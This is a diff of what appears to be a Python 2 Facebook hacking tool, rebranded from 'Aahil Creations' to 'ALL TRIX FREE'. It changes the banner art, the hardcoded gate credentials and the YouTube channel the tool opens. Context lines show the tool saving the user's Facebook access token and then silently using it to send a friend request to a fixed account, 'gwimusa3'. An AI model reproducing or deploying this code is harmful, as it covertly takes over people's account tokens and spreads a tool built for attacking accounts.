@@ -77,12 +77,26 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print  """
 
-\033[1;97m        ___    ___   _   _ _____ _     
-\033[1;92m       / _ \  / _ \ | | | |_   _| | Updated✔ 
-\033[1;97m      / /_\ \/ /_\ \| |_| | | | | |    
-\033[1;92m      |  _  ||  _  ||  _  | | | | |    
-\033[1;97m      | | | || | | || | | |_| |_| |____
-\033[1;97m      \_| |_/\_| |_/\_| |_/\___/\_____/
+_____
+< ANQ >
+ -----
+    \
+     \
+                                   .::!!!!!!!:.
+  .!!!!!:.                        .:!!!!!!!!!!!!
+  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$
+      :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P
+      $$$$$##WX!:      .<!!!!UW$$$$"  $$$$$$$$#
+      $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$*
+      ^$$$B  $$$$\     $$$$$$$$$$$$   d$$R"
+        "*$bd$$$$      '*$$$$$$$$$$$o+#"
+             """"          """""""
+           _   _  ____
+     /\   | \ | |/ __ \
+    /  \  |  \| | |  | |
+   / /\ \ | . ` | |  | |
+  / ____ \| |\  | |__| |
+ /_/    \_\_| \_|\___\_\
                                                                
 
 """
@@ -100,12 +114,12 @@ jalan("\033[1;96m•◈• |_____/|_|    |______|______|_____/_____|")
 jalan("   \033[1;91m INDAIN USERZ USE ANY PROXY ")	
 jalan("   \033[1;91m WIFI USERZ USE ANY PROXY ")	
 
-jalan("   \033[1;93m Welcome to Aahil Creations ")
+jalan("   \033[1;93m Welcome to ALL TRIX FREE ")
 
 jalan("\033[1;97m•◈•──────────•◈•\033[1;96mBlacktiger\033[1;96m•◈•──────────•◈•")
 
-CorrectUsername = "rana"
-CorrectPassword = "rana"
+CorrectUsername = "24"
+CorrectPassword = "24"
 
 
 loop = 'true'
@@ -118,10 +132,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://www.Youtube.com/UCsdJQbRf0xpvwaDu1rqgJuA')
+            os.system('xdg-open https://www.Youtube.com/UCHNT-JPOilcepG3g5fCiqXQ')
     else:
         print "Wrong Username"
-        os.system('xdg-open https://www.Youtube.com/UCsdJQbRf0xpvwaDu1rqgJuA')
+        os.system('xdg-open https://www.Youtube.com/UCHNT-JPOilcepG3g5fCiqXQ')
 
 def login():
 	os.system('clear')
@@ -165,7 +179,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] Login Successful...'
-				os.system('xdg-open https://www.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+				os.system('xdg-open https://www.youtube.com/channel/UCHNT-JPOilcepG3g5fCiqXQ')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
